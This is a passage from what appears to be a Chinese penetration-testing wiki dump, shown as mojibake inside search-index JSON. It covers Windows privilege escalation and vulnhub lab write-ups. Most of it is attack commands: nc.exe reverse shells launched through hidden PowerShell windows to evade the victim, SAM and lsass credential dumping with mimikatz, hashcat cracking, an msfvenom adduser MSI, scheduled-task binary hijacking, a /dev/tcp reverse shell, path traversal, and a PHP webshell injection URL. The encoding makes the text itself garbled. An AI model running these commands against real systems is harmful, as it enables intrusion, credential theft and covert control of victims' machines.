æ¥å€ŸåŠ© nc.exe å·¥å…·æ¥è·å–åå‘ shellï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator c:\\temp c.exe 172.16.1.30 443 -e cmd.exe å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™å¯èƒ½ä¼šåœ¨å—å®³è€…æœºå™¨ä¸Šæ‰“å¼€ cmd çª—å£ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥è½»æ¾å…³é—­å®ƒã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ PowerShell ä»éšè—çª—å£æ‰§è¡Œå‘½ä»¤ï¼Œä»è€Œå¢åŠ éšè”½æ€§ã€‚è¿™æ ·ï¼Œå—å®³è€…é‚£è¾¹å°±ä¸ä¼šæ‰“å¼€ä»»ä½•çª—å£ï¼Œä¹Ÿå°±ä¸ä¼šé‚£ä¹ˆè½»æ¾çš„å°±æ€æ­»æˆ‘ä»¬çš„ shellã€‚ runas /env /noprofile /savecred /user:JUGG-efrost\\administrator powershell.exe -w hidden -c c:\\temp c.exe 172.16.1.30 443 -e cmd.exe æ­¤å¤–ï¼Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰å¯¹å—å®³è€…æœºå™¨çš„è¿œç¨‹æ¡Œé¢æƒé™ï¼Œé‚£ä¹ˆä¾¿ä¸éœ€è¦åƒä¸Šé¢é‚£ä¹ˆéº»çƒ¦ï¼Œåªéœ€ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ã€‚ runas /env /noprofile /savecred /user:JUGG-efrost\\administrator cmd é…ç½®æ–‡ä»¶æœç´¢é…ç½®æ–‡ä»¶å¸¸è§é…ç½®æ–‡ä»¶ä½ç½® C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xmlï¼ˆå¸¸è§ï¼‰ C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.xml C:\\Windows\\system32\\sysprep\\sysprep.xml é€’å½’å¼æœç´¢å½“å‰ç›®å½•ä¸­ä»¥passä¸ºåçš„æ–‡ä»¶ï¼Œæˆ–ä»¥.configç»“å°¾ï¼š dir /s *pass* == *.config é€’å½’å¼æœç´¢å½“å‰ç›®å½•ä¸­åŒ…å«â€passwordâ€ä¸€è¯çš„æ–‡ä»¶ï¼Œæœ€åä¹Ÿä»¥ä»»ä½•ä¸€ä¸ª.xmlï¼Œ.iniï¼Œ.txt findstr /si password *.xml *.ini *.txt .\\winPEASany.exe quiet cmd searchfast filesinfo æˆ–è€…PowerUp çŸ¥é“å¯†ç åï¼Œå¯ä»¥ç”¨winexeåå¼¹shell SAMWindowsç³»ç»Ÿä¸‹çš„hashå¯†ç æ ¼å¼ç”¨æˆ·åç§°:RID:LM-HASHå€¼:NT-HASHå€¼ ä¾‹å¦‚ï¼š Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4::: ç”¨æˆ·åç§°ä¸ºï¼šAdministrator RIDä¸ºï¼š500 LM-HASHå€¼ä¸ºï¼šC8825DB10F2590EAAAD3B435B51404EE NT-HASHå€¼ä¸ºï¼š32ED87BDB5FDC5E9CBA88547376818D4 é€šè¿‡SAMæ–‡ä»¶+mimikatzè¯»å–å¯†ç windowsçš„ç”¨æˆ·hashä¸€èˆ¬æ˜¯å­˜å‚¨åœ¨C:\\windows\\system32\\config\\SAMæ–‡ä»¶ä¸­ï¼ˆåŸŸæ§å­˜åœ¨NTDS.ditæ–‡ä»¶ä¸­ï¼‰ï¼Œåªä¸è¿‡ï¼Œå°±ç®—æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œä¹Ÿæ˜¯æ— æ³•æ­£å¸¸æ‰“å¼€å¹¶è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå› æ­¤ä¸€èˆ¬æ— æ³•ç›´æ¥é€šè¿‡SAMæ–‡ä»¶è·å–ç”¨æˆ·hashã€‚ reg save hklm\\sam C:\\hash\\sam.hive reg save hklm\\system C:\\hash\\system.hive å°†ä¸Šè¿°è·å¾—çš„sys.hivå’Œsam.hivæ–‡ä»¶å¤åˆ¶åˆ°mimikatzæ‰€åœ¨æ–‡ä»¶å¤¹ï¼Œè¿è¡Œmimikatzï¼Œ è¾“å…¥lsadump::sam /system:sys.hiv /sam:sam.hivï¼Œå³å¯å¯¼å‡ºæ‰€æœ‰ç”¨æˆ·å¯†ç hash ä¸‹è½½ä¿¡ç”¨å¥—ä»¶ï¼šgit clone https://github.com/Neohapsis/creddump7.git è¿è¡Œå¯¹SAMå’Œç³»ç»Ÿæ–‡ä»¶çš„å·¥å…·æ¥æå–å“ˆå¸Œï¼špython2 creddump7/pwdump.py SYSTEM SAM ä½¿ç”¨hashcatç ´è§£ç®¡ç†å‘˜ç”¨æˆ·å“ˆå¸Œï¼šhashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt åœ¨ Windows è¿è¡Œæ—¶ï¼Œæ–‡ä»¶å·²é”å®šã€‚æ–‡ä»¶çš„å¤‡ä»½å¯èƒ½å­˜åœ¨äºC:\\Windows\\Repair or C:\\Windows\\System32\\config\\RegBack directories lsass.exe è¿›ç¨‹lsass.exeæ˜¯ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºæœ¬åœ°å®‰å…¨è®¤è¯ï¼Œç”¨æˆ·çš„hashä¿¡æ¯å°±å­˜åœ¨lsass.exeç¨‹åºå†…å­˜ä¸­ã€‚æˆ‘ä»¬ä¸€èˆ¬å°±æ˜¯ä»¥lsass.exeè¿›ç¨‹ä¸ºç›®æ ‡ï¼Œä½¿ç”¨å·¥å…·ä»è¯¥è¿›ç¨‹ä¸­dumpå‡ºå·²ç™»å½•ç”¨æˆ·çš„hashç›¸å…³ä¿¡æ¯ ä½†å¯ä»¥é€šè¿‡æ³¨å†Œè¡¨å¯¼å‡ºsamå’Œsystemæ–‡ä»¶ procdump64(å¾®è½¯è‡ªå·±çš„å·¥å…·)+mimikatzprocdump64.exe -accepteula -ma lsass.exe lsass.dmp ä½¿ç”¨æœ¬åœ°çš„mimikatz.exeè¯»å–lsass.dmp Scheduled TasksæŸ¥çœ‹è®¡ç®—æœºä¸Šä»¥ç®¡ç†æƒé™è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡ã€‚schtasks /query /fo LIST /vschtasks /query /fo list /v schtasks.txtschtasks /query /fo LIST /v | findstr ç®¡ç†å‘˜schtasks /query /fo LIST /v | findstr Snipaste ä½¿ç”¨AccessChkæŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µã€‚å¦‚æœæˆ‘ä»¬å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨ç›®å½•å…·æœ‰å†™å…¥æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–æ‰åŸæ¥çš„ç¨‹åºã€‚ accesschk -dqv C:/Program Files/Snipaste-1.16.2-x86 -accepteula å…·æœ‰å†™å…¥æƒé™ï¼Œå°†æ¶æ„ç¨‹åºæ”¾å…¥å¯¹åº”ç›®å½•ä¸‹ã€‚ æ‰§è¡Œé‡å¯å‘½ä»¤ã€‚å½“è®¡åˆ’ä»»åŠ¡ä¸‹æ¬¡æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä»¥é«˜æƒé™è¿è¡Œæ¶æ„ç¨‹åºï¼Œè¿›è€Œå®Œæˆææƒã€‚æˆåŠŸææƒåè®°å¾—ä¿®æ”¹å›é…ç½®ã€‚ shutdown -r -t 0 åœ¨Windowsä¸­å¯ä»¥åˆ©ç”¨è®¡åˆ’ä»»åŠ¡è¦†ç›–åŸæœ‰çš„ç¨‹åºæ¥è¿›è¡Œæ›¿æ¢\\ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹è®¡ç®—æœºä¸Šçš„è®¡åˆ’ä»»åŠ¡ã€‚\\ schtasks /query /fo LIST /v ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µã€‚å¦‚æœæˆ‘ä»¬å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨ç›®å½•å…·æœ‰å†™å…¥æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–æ‰åŸæ¥çš„ç¨‹åºã€‚å½“è®¡åˆ’ä»»åŠ¡ä¸‹æ¬¡æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä»¥é«˜æƒé™è¿è¡Œæ¶æ„ç¨‹åºï¼Œè¿›è€Œå®Œæˆææƒã€‚ accesschk.exe -dqv D:test -accepteula ç”¨æˆ·æƒé™å‰è¨€åœ¨Windowsä¸­ï¼Œå¯ä»¥ä¸ºç”¨æˆ·å¸æˆ·å’Œç»„åˆ†é…ç‰¹å®šçš„â€œç‰¹æƒâ€ã€‚ è¿™äº›ç‰¹æƒæˆäºˆå¯¹æŸäº›èƒ½åŠ›çš„è®¿é—®æƒã€‚å…¶ä¸­ä¸€äº›èƒ½åŠ›å¯ä»¥ç”¨æ¥å°†æˆ‘ä»¬çš„æ€»ä½“ç‰¹æƒæå‡åˆ°ç³»ç»Ÿçš„æƒé™ã€‚ åˆ—å‡ºç”¨æˆ·æƒé™whoami /all SeImpersonatePrivilegeå¯ä»¥ä½¿ç”¨çƒ‚åœŸè±† SeAssignPrimaryPrivilegeå¯ä»¥ä½¿ç”¨çƒ‚åœŸè±† SeAssignPrimaryPrivilegeå¯ä»¥ä½¿ç”¨çƒ‚åœŸè±† SeBackupPrivilegeæˆäºˆå¯¹æ‰€æœ‰å¯¹è±¡çš„è¯»å–æƒé™ åœ¨ç³»ç»Ÿä¸Šï¼Œä¸ç®¡ä»–ä»¬çš„ACLä½¿ç”¨æ­¤æƒé™ï¼Œç”¨æˆ·å¯ä»¥è®¿é—®æ•æ„Ÿçš„æˆ–è€…ä»æ³¨å†Œè¡¨ä¸­æå–å“ˆå¸Œå€¼ ç„¶åè¿›è¡Œç ´è§£æˆ–ç”¨äºä¼ é€’æ•£åˆ—æ”»å‡»ã€‚ SeRestorePrivilegeSeRestorePrivilegeæˆäºˆå¯¹ç³»ç»Ÿä¸Šæ‰€æœ‰å¯¹è±¡çš„å†™è®¿é—®æƒï¼Œè€Œä¸ç®¡å®ƒä»¬çš„ACLå¦‚ä½•ã€‚ æ»¥ç”¨ç‰¹æƒçš„ä¸‰ç§æ–¹å¼ï¼š ä¿®æ”¹æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶ è¦†ç›–ç³»ç»Ÿè¿›ç¨‹ä½¿ç”¨çš„DLL ä¿®æ”¹æ³¨å†Œè¡¨è®¾ç½® SeTakeOwnershipPrivilegeSeTakeOwnershipPrivilegeå…è®¸ç”¨æˆ·å–å¾—æ‰€æœ‰æƒï¼Œåœ¨å¯¹è±¡ä¸Šï¼ˆå†™å…¥æ‰€æœ‰è€…æƒé™ï¼‰ ä¸€æ—¦æ‚¨æ‹¥æœ‰ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å¯ä»¥ä¿®æ”¹å®ƒçš„ACLå¹¶æˆäºˆä½ è‡ªå·±å†™è®¿é—®æƒé™ ä¸SeRestorePrivilegeä½¿ç”¨çš„æ–¹æ³•ç›¸åŒ å…¶ä»–ç‰¹æƒ(æ›´é«˜çº§) SeTcbPrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeDebugPrivilege (used by getsystem) æŒ‰ç³»ç»Ÿç±»å‹ Windows20002003ã€XPatæœ¬åœ°å‘½ä»¤ææƒåœ¨ Windows2000ã€Windows 2003ã€Windows XP è¿™ä¸‰ç±»ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾å°† Administrators ç»„ä¸‹çš„ç”¨æˆ·æƒé™æå‡åˆ° SYSTEM at æ˜¯ä¸€ä¸ªå‘å¸ƒå®šæ—¶ä»»åŠ¡è®¡åˆ’çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè¯­æ³•æ¯”è¾ƒç®€å•ã€‚é€šè¿‡ at å‘½ä»¤å‘å¸ƒçš„å®šæ—¶ä»»åŠ¡è®¡åˆ’ï¼Œ Windows é»˜è®¤ä»¥ SYSTEM æƒé™è¿è¡Œã€‚å®šæ—¶ä»»åŠ¡è®¡åˆ’å¯ä»¥æ˜¯æ‰¹å¤„ç†ã€å¯ä»¥æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ è¯­æ³•ï¼šat æ—¶é—´ å‘½ä»¤ä¾‹å­ï¼šat 10:45PM calc.exe è¯¥å‘½ä»¤ä¼šå‘å¸ƒä¸€ä¸ªå®šæ—¶ä»»åŠ¡è®¡åˆ’ï¼Œåœ¨æ¯æ—¥çš„ 10:45 å¯åŠ¨ calc.exeã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ â€œinteractiveâ€å¼€å¯ç•Œé¢äº¤äº’æ¨¡å¼ï¼š åœ¨å¾—åˆ°ä¸€ä¸ªsystemçš„cmdä¹‹åï¼Œä½¿ç”¨ taskmgr å‘½ä»¤è°ƒç”¨ä»»åŠ¡ç®¡ç†å™¨ï¼Œæ­¤æ—¶çš„ä»»åŠ¡ç®¡ç†å™¨æ˜¯systemæƒé™ï¼Œç„¶åkillæ‰exploreè¿›ç¨‹ï¼Œå†ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨æ–°å»ºexploreè¿›ç¨‹ï¼Œå°†ä¼šå¾—åˆ°ä¸€ä¸ªsystemçš„æ¡Œé¢ç¯å¢ƒ at é…åˆ msfææƒmsfä¸‹ç”Ÿæˆæœ¨é©¬æ–‡ä»¶ï¼Œè·å–ä¼šè¯ä¹‹åï¼Œç„¶åè¿›å…¥shell atå‘½ä»¤æ‰§è¡Œè¿è¡Œç¨‹åºï¼Œ å†å¼€ä¸ªçª—å£ç›‘å¬è¿™ä¸ªç«¯å£ï¼Œä¸Šçº¿åå³ä¸ºsystem windows 78ã€0308ã€1216scå‘½ä»¤ææƒå…³äºscå‘½ä»¤ï¼š SC æ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åºã€‚æä¾›çš„åŠŸèƒ½ç±»ä¼¼äºâ€œæ§åˆ¶é¢æ¿â€ä¸­â€œç®¡ç†å·¥å…·â€é¡¹ä¸­çš„â€œæœåŠ¡â€ã€‚ sc Create syscmd binPath= cmd /K start type= own type= interact è¿™ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯åˆ›å»ºä¸€ä¸ªåå« syscmd çš„æ–°çš„äº¤äº’å¼çš„ cmd æœåŠ¡ï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªsystemæƒé™çš„cmdç¯å¢ƒï¼š sc start systcmd AlwaysInstallElevatedAlwaysInstallElevated æ˜¯ä¸€ç§å…è®¸éç®¡ç†ç”¨æˆ·ä»¥SYSTEMæƒé™è¿è¡ŒMicrosoft Windowså®‰è£…ç¨‹åºåŒ…ï¼ˆ.MSIæ–‡ä»¶ï¼‰çš„è®¾ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ç¦ç”¨æ­¤è®¾ç½®ï¼Œéœ€ç³»ç»Ÿç®¡ç†å‘˜æ‰‹åŠ¨å¯ç”¨ä»–ã€‚ å¯ä»¥é€šè¿‡æŸ¥è¯¢ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹æ¥è¯†åˆ«æ­¤è®¾ç½®ï¼š [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] â€œAlwaysInstallElevatedâ€=dword:00000001[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] â€œAlwaysInstallElevatedâ€=dword:00000001 ä½¿ç”¨reg queryå‘½ä»¤æŸ¥è¯¢æ˜¯å¦å­˜åœ¨æ¼æ´ C: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedorC: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated å¦‚æœç³»ç»Ÿæ²¡è¿™ä¸ªæ¼æ´ï¼Œå®ƒå°†è¾“å‡ºé”™è¯¯: ERROR: The system was unable to find the specified registry key or value. å¦‚æœå­˜åœ¨æ¼æ´ï¼Œä¸Šé¢å°†è¾“å‡ºä»¥ä¸‹å†…å®¹: ç„¶åæˆ‘ä»¬ä½¿ç”¨msfvenomç”Ÿæˆmsiæ–‡ä»¶ï¼Œè¿›è¡Œææƒ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\\programdata\\rotten.msi# /quiet å®‰è£…è¿‡ç¨‹ä¸­ç¦æ­¢å‘ç”¨æˆ·å‘é€æ¶ˆæ¯# /qn ä¸ä½¿ç”¨GUI# /i å®‰è£…ç¨‹åºmsfä¸‹çš„è‡ªåŠ¨æ¨¡å—exploit/windows/local/always_install_elevated Unattended Installsè‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§ å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚ è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚ å…¨ç›˜æœç´¢Unattendæ–‡ä»¶æ˜¯ä¸ªå¥½åŠæ³•ï¼Œå®ƒé€šå¸¸ä¼šåœ¨ä»¥ä¸‹ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼š C:\\Windows\\Panther\\ C:\\Windows\\Panther\\Unattend\\ C:\\Windows\\System32\\ C:\\Windows\\System32\\sysprep\\ é™¤äº†Unattend.xmlæ–‡ä»¶å¤–ï¼Œè¿˜è¦ç•™æ„ç³»ç»Ÿä¸­çš„sysprep.xmlå’Œsysprep.infæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¸­éƒ½ä¼šåŒ…å«éƒ¨ç½²æ“ä½œ ç³»ç»Ÿæ—¶ä½¿ç”¨çš„å‡­æ®ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬ææƒã€‚ C:\\Users\\user\\Desktop dir C:*vnc.ini /s /b /c#æˆ–è€…åœ¨åç§°ä¸­åŒ…å«å…³é”®è¯çš„é¡¹ç›®ï¼šC:\\Users\\user\\Desktop dir C:\\ /s /b /c | findstr /sr *password*#æˆ–è€…å¯ä»¥åœ¨æ–‡ä»¶å†…å®¹ä¸­æœç´¢passwordä¹‹ç±»çš„å…³é”®å­—ï¼šC:\\Users\\user\\Desktopfindstr /si password *.txt | *.xml | *.ini#å¯ä»¥æŸ¥è¯¢æ³¨å†Œè¡¨ï¼Œä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²passwordï¼šreg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s åœ¨è¿™äº›æ–‡ä»¶ä¸­é€šå¸¸åŒ…å«ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯†ç ä½¿ç”¨base64ç¼–ç ï¼Œå¹¶ä¸”åœ¨æœ€åä¼šé™„åŠ â€Passwordâ€ï¼Œæ‰€ä»¥çœŸæ­£çš„å¯† ç éœ€è¦å»æ‰æœ€åçš„â€Passwordâ€ã€‚ #msfæ¨¡å—post/windows/gather/enum_unattend ç¬¬ä¸‰æ–¹è½¯ä»¶æ¼æ´ææƒmysqldocker æ›´æ–°: 2025-11-17 11:43:05åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/owwvd1130r1klgal"},{"title":"é¶åœº","path":"/wiki/WebçŸ¥è¯†ç‚¹/SQLæ³¨å…¥/é¶åœº/index.html","content":""},{"title":"å¯†ç ","path":"/wiki/WebçŸ¥è¯†ç‚¹/å¸¸è§å¯†ç &è·¯å¾„/å¯†ç /index.html","content":""},{"title":"GeminiIncv1","path":"/wiki/WP/Windowsææƒ/vulnhub/GeminiIncv1.html","content":"GeminiInc v1å‰æ kali 192.168.129.152 é¶æœº NATæ¨¡å¼ ä¿¡æ¯æ”¶é›†ipæ£€æµ‹ nmap -sP 192.168.129.024 ip ä¸º 192.168.129.166 ç«¯å£æ£€æµ‹nmap -sT -sV -Pn 192.168.129.166 -p- -A åªå¼€æ”¾äº†22,80 æ¸—é€æµ‹è¯•ææƒ æ›´æ–°: 2025-11-21 21:43:24åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/kr14wpru9rzcti1a"},{"title":"GeminiInc v1","path":"/wiki/WP/Windowsææƒ/vulnhub/GeminiInc v1.html","content":"å‰æ kali 192.168.129.152 é¶æœº NATæ¨¡å¼ ä¿¡æ¯æ”¶é›†ipæ£€æµ‹ nmap -sP 192.168.129.024 ip ä¸º 192.168.129.166 ç«¯å£æ£€æµ‹nmap -sT -sV -Pn 192.168.129.166 -p- -A åªå¼€æ”¾äº†22,80 æ¸—é€æµ‹è¯•ææƒ"},{"title":"Toppo","path":"/wiki/WP/Windowsææƒ/vulnhub/Toppo.html","content":"å‰æ kali ip 192.168.129.152 é¶æœº NAT æ¨¡å¼ ä¿¡æ¯æ”¶é›†æ£€æµ‹ipnmap -sP 192.168.129.024 ip æ˜¯192.168.129.165 æ£€æµ‹ç«¯å£nmap -sT -sV -Pn 192.168.129.165 -p- -A æ‰«çš„å¤ªæ…¢äº†çš„è¯ï¼Œæ¢è¿™ä¸ªnmap -sS -sV -Pn 192.168.129.165 -p- -A -sS å°±æ˜¯ TCP SYN åŠè¿æ¥æ‰«æ 22,80,111ç«¯å£å¼€æ”¾ æ¸—é€æµ‹è¯•å…ˆçœ‹æ¯”è¾ƒé‡è¦çš„80ç«¯å£ 80ç«¯å£æœåŠ¡å™¨æ˜¯Apache 2.4.10 åšå®¢æ˜¯start Bootstrap æ­å»ºçš„ æœç´¢Apacheå†å²æ¼æ´ è¿™æœ‰ç‚¹å¤šäº†ï¼Œeholeæ£€æµ‹ä¸€ä¸‹æŒ‡çº¹ä¿¡æ¯ï¼Œç¼©å°é€‰é¡¹ ç¼©å°ä¸äº†ï¼Œå…ˆçœ‹åªæœ‰Apacheçš„ï¼Œ è²Œä¼¼å¤±è´¥äº† searchsploit Bootstrap åªæœ‰xssï¼Œè²Œä¼¼ä¸èƒ½getshell ç›®å½•æ‰«æä¸€æ³¢python dirsearch.py -u http://192.168.129.165/ æœ‰ä¸ªadminç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ æŸ¥çœ‹notes.txt æœ‰ä¸€ä¸ªå¯†ç ï¼Œç„¶åå°è¯•è®¿é—®ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰ç™»é™†å¤„mailé‡Œä»€ä¹ˆéƒ½æ²¡æœ‰ http://192.168.129.165/vendor/ è¿™ä¸ªå¥½åƒæ˜¯ä¸ªç›®å½•,ç›®å½•ç©¿è¶Šå¤±è´¥ http://192.168.129.165/manual/en/index.html ok,ç½‘é¡µç«¯æ²¡æœ‰ç™»é™†ç•Œé¢111ç«¯å£searchsploit rpcbind å¥½åƒéƒ½æ˜¯dosæ”»å‡» æ²¡æƒ³åˆ°è¿˜æœ‰ä¸€ä¸ªsshç™»å½•ï¼Œå°è¯•ä¸€ä¸‹å¯†ç æ˜¯12345ted123ï¼Œè´¦å·å¯èƒ½æ˜¯tedå°è¯•ç™»é™† ç™»é™†æˆåŠŸ ææƒ è¿™ä¸ªå°±ä¸ç”¨åå¼¹shelläº†ï¼Œå½“ç„¶ï¼Œæ„¿æ„çš„è¯ä¹Ÿå¯ä»¥sh -i devtcp192.168.129.1525555 01 å°è¯•sudoææƒ æŸ¥çœ‹etcpasswdåªæœ‰ä¸€ä¸ªç”¨æˆ· suidå°è¯•æŸ¥çœ‹æ˜¯å¦æœ‰ç‰¹æƒæ–‡ä»¶find -perm -us -type f 2devnull å°è¯•python2.7ææƒusrbinpython2.7 -c â€˜import os; os.setuid(0); os.system(â€œbinbashâ€)â€™"},{"title":"Kioptrix 2014 (#5)","path":"/wiki/WP/Windowsææƒ/vulnhub/Kioptrix 2014 (#5).html","content":"å‰ækali ip 192.168.129.152ä¿¡æ¯æ”¶é›†ipæ”¶é›†nmap -sP 192.168.129.024 ç«¯å£æ”¶é›†nmap -sT -sV -Pn -v 192.168.129.164 -p- -A æ‰«æåˆ° 22ï¼Œ80ï¼Œ8080ï¼Œ ä½†æ˜¯22ç«¯å£å…³é—­äº† çœ‹çœ‹udp ç«¯å£ nmap -sU -p- 192.168.129.164 æ—  æ¸—é€æµ‹è¯•80ç«¯å£ æ£€æŸ¥æºä»£ç  è®¿é—® eholeæ‰«ææŒ‡çº¹ Apache,FreeBSD,mod_ssl,mod_dav, | Apache2.2.21 (FreeBSD) mod_ssl2.2.21 OpenSSL0.9.8q DAV2 PHP5.3.8 æ‰«ç§’æ˜¯å¦æœ‰æ¼æ´ æŸ¥çœ‹å†…å®¹ç›®å½•ç©¿è¶Šhttp://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fetc/passwd æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œä½†éƒ½ä¸èƒ½ç™»å½•ï¼Œå°è¯•å†…æ ¸æ¼æ´ etcshadow æ²¡æœ‰æƒé™ å¯ä»¥æŸ¥çœ‹apacheçš„é…ç½®http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf åªå…è®¸Mozilla4_browser æ›¿æ¢ä¸€ä¸‹ ä½¿ç”¨è¿™ä¸ªæ’ä»¶ï¼Œè‡ªå®šä¹‰ User-Agent :Mozilla4.0 ä½†æ˜¯æ„Ÿè§‰ä¸å¤ªå¥½ç”¨ï¼Œé»˜è®¤çš„è¯ï¼Œæµè§ˆå™¨ä¸èƒ½ç”¨ è¿˜æ˜¯ç”¨BPå§ æœä¸€ä¸‹æ˜¯ä»€ä¹ˆï¼Œå¤§æ¦‚æ˜¯cms æœ‰msfæ¨¡å—ï¼Œç›´æ¥ç”¨ å¤±è´¥ ç¿»çœ‹åˆ«äººç¬”è®°ï¼ŒåŸæ¥æ˜¯æ²¡æœ‰è®¾ç½®payload æœ€é‡è¦çš„ä¸€ç‚¹ï¼Œæ²¡æœ‰è®¾ç½®ua show advanced å¯ä»¥æŸ¥çœ‹è¯¦ç»†å†…å®¹ æ‰‹å·¥å°è¯• exploitdb æ˜¾ç¤º å¯ä»¥æœ‰ä¸¤ä¸ªæ–¹æ³• å°è¯•è¾“å…¥ä¸€å¥è¯æœ¨é©¬ http://192.168.129.164:8080/phptax/drawimage.php?pfilez=xxx;echo%20%27%3C?php%20echo%20system($_GET[%22cmd%22])%20?%3E%27%20%3E%202.php;pdfmake çœ‹çœ‹æˆåŠŸæ²¡æœ‰ å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿æ¥èšå‰‘è¿ä¸ä¸Š èšå‰‘è¿ä¸ä¸ŠåŸå› :å¾—ç”¨é€‚ç”¨åˆé€‚çš„ä¸€å¥è¯æœ¨é©¬è¿™æ ·æ‰èƒ½è¿ä¸Š xsshttp://192.168.129.164/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E ä½†å¯¹ææƒä½œç”¨ä¸å¤§ 8080ç«¯å£ ç¦æ­¢è®¿é—® æƒé™æå‡æœç´¢æ¼æ´ searchsploit FreeBSD 9.0 28718.cæ²¡æœ‰æˆåŠŸï¼Œå°è¯•263è¿™ä¸ª ç³»ç»Ÿé‡Œåªæœ‰nc å’Œgcc kali å‘é€æ–‡ä»¶ nc -lvp 555526368.cå®¢æˆ·æœºæ¥å—æ–‡ä»¶ nc 192.168.129.152 5555 111.cç¼–è¯‘ï¼Œæ‰§è¡Œ è·å–ä¿¡æ¯ æ€»ç»“ ç¬¬ä¸€æ¬¡ç”¨searchsploit ä¸å¤ªç†Ÿç»ƒï¼Œè¿˜å¾—å¤šç”¨ï¼Œè‹±æ–‡è¿˜å¾—å¥½å¥½çœ‹ ä¸­å›½èšå‰‘è¿æ¥é—®é¢˜ ï¼šå¾—ç”¨ç›¸åº”æœ¨é©¬ï¼Œä¸ç„¶è¿ä¸ä¸Šèšå‰‘"},{"title":"devrandom 